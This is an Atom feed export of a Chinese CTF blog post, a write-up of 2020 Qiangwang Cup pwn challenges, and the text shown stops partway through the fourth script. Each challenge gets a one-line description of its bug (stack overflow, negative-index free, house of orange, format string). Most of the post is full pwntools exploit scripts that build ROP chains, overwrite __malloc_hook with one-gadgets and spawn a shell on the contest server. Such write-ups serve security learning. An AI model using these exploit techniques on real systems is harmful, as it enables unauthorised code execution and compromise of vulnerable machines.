<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nocbtm&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://nocbtm.github.io/"/>
  <updated>2020-09-01T11:58:28.224Z</updated>
  <id>https://nocbtm.github.io/</id>
  
  <author>
    <name>nocbtm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2020强网杯pwn wp</title>
    <link href="https://nocbtm.github.io/2020/08/30/2020%E5%BC%BA%E7%BD%91%E6%9D%AFpwn-wp/"/>
    <id>https://nocbtm.github.io/2020/08/30/2020强网杯pwn-wp/</id>
    <published>2020-08-30T11:25:19.000Z</published>
    <updated>2020-09-01T11:58:28.224Z</updated>
    
    <content type="html"><![CDATA[<p>ctf真是秃头爆肝游戏，肝了两天出了六道pwn，pwn题真的太多了，做到不想做。</p><p>最终48名，尽力了，没有进线下。</p><p><img alt="img" data-src="https://nocbtm.github.io/imgs/ISEE3DP466PG13`N6[3%EQ6.png" class="lozad"></p><h2 id="babymessage"><a href="#babymessage" class="headerlink" title="babymessage"></a>babymessage</h2><p>leave_message 函数有栈溢出，先构造rop链泄漏libc_addr，然后再次溢出，构造systme(“/bin/sh”)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">pwn_name = <span class="string">"babymessage"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.27'</span></span><br><span class="line">ip, port = <span class="string">'123.56.170.202'</span>, <span class="number">21342</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"name:"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msg</span><span class="params">(message)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"message:"</span>, message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice"</span>, <span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name(p32(<span class="number">256</span>) + <span class="string">"\n"</span>)</span><br><span class="line">msg(<span class="string">"a"</span> * <span class="number">8</span> + p64(<span class="number">0x6010D0</span> + <span class="number">4</span>) + <span class="string">"b"</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"/bin/sh\x00"</span>.ljust(<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x400ac3</span>) + p64(<span class="number">0x601038</span>)</span><br><span class="line">payload += p64(<span class="number">0x400ac1</span>) + p64(<span class="number">0x601038</span>) * <span class="number">2</span> +  p64(<span class="number">0x400670</span>)</span><br><span class="line">payload += p64(<span class="number">0x400ac3</span>) + p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(<span class="number">0x40080A</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"message:"</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">"done!\n\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"done!\n\n"</span>)</span><br><span class="line">read_libc = u64(p.recv(<span class="number">6</span>) + <span class="string">"\x00\x00"</span>)</span><br><span class="line">log.success(<span class="string">"0x%x"</span> %read_libc)</span><br><span class="line"></span><br><span class="line">libc_base = read_libc - <span class="number">0x110180</span></span><br><span class="line">log.success(<span class="string">"0x%x"</span> %libc_base)</span><br><span class="line">binsh = libc_base + <span class="number">0x1B40FA</span></span><br><span class="line">system_ = libc_base + <span class="number">0x4f4e0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0x400ac3</span>) + p64(binsh) + p64(system_)</span><br><span class="line">p.sendafter(<span class="string">"message:"</span>, payload + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="babynotes"><a href="#babynotes" class="headerlink" title="babynotes"></a>babynotes</h2><p>free的时候idx可以输入负数，register时刚好输入的age就在chunk_list上面，先泄露出libc_addr和堆的地址，然后更新age为堆块的地址，即可造成堆块复用，然后用fatsbin attack 攻击<code>__malloc_hook</code>为onegadget即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"babynotes"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'123.56.170.202'</span>, <span class="number">43121</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">    p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">    libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(ip,port)</span><br><span class="line">    libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            <span class="comment">#one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span></span><br><span class="line">            one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(name,motto,age)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">"name: \n"</span>,name)</span><br><span class="line">    p.sendafter(<span class="string">"motto: \n"</span>,motto)</span><br><span class="line">    p.sendlineafter(<span class="string">"age: \n"</span>,str(age))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'\n'</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'\n'</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'\n'</span>,str(idx))</span><br><span class="line">    p.sendafter(<span class="string">'\n'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line">register(<span class="string">"n"</span>*<span class="number">0x17</span>,<span class="string">"a"</span>*<span class="number">0x20</span>,<span class="number">0x66666666</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address=leak<span class="number">-0x3c4b78</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">8</span>)</span><br><span class="line">leak=u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_addr=leak<span class="number">-0x230</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,heap_addr)</span><br><span class="line"></span><br><span class="line">choice(<span class="number">5</span>)</span><br><span class="line">register(<span class="string">"n"</span>*<span class="number">0x17</span>,<span class="string">"a"</span>*<span class="number">0x20</span>,heap_addr+<span class="number">0x1d0</span>)</span><br><span class="line">free(<span class="number">-3</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(libc.sym[<span class="string">"__malloc_hook"</span>]<span class="number">-0x23</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(one[<span class="number">3</span>]+libc.address))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;df8791b3e5b410506265d92cd8396e59&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Just-a-Galgame"><a href="#Just-a-Galgame" class="headerlink" title="Just_a_Galgame"></a>Just_a_Galgame</h2><p>edit的时候没有检查idx，且有溢出，溢出修改top_chunk的size,需要满足内存页对齐，house of orange 攻击，会有free过后的unsorted bin ，再次申请小堆块，可泄漏libc_addr, 5功能可写入<code>__malloc_hook-0x60</code>的地址进行攻击，然后edit写入onegadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Just_a_Galgame"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.27'</span></span><br><span class="line">ip, port = <span class="string">"123.56.170.202"</span>, <span class="number">52114</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            <span class="comment">#one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span></span><br><span class="line">            one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            <span class="comment">#one = [0x4f2c5 , 0x4f322 , 0x10a38c]</span></span><br><span class="line">            one = [<span class="number">0x4f365</span>, <span class="number">0x4f3c2</span>, <span class="number">0x10a45c</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">()</span>:</span>  <span class="comment">#0x68</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,meg)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;"</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">"&gt;&gt;"</span>,meg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">()</span>:</span> <span class="comment">#0x1000</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xd41</span>))</span><br><span class="line"></span><br><span class="line">add2()</span><br><span class="line">add()</span><br><span class="line">show()</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3ec2a0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base = "</span>+hex(libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + <span class="number">0x3ebc30</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"5"</span>)</span><br><span class="line">p.send(p64(malloc_hook<span class="number">-0x60</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,p64(one[<span class="number">1</span>]+libc_base))</span><br><span class="line">add()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;145f2d9125917286c21df2bf470a8a81&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Siri"><a href="#Siri" class="headerlink" title="Siri"></a>Siri</h2><p>sub_1212 里面很明显的格式化字符串，先泄露出libc_addr和ebp_addr，然后修改mian函数返回地址为onegadget，最终修改，sub_1212函数返回地址为main函数里面的leave ret，即可跳出while循环，劫持程序执行流为onegadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Siri"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.27'</span></span><br><span class="line">ip, port = <span class="string">'123.56.170.202'</span>,<span class="number">12124</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">    p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">    libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(ip,port)</span><br><span class="line">    libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span 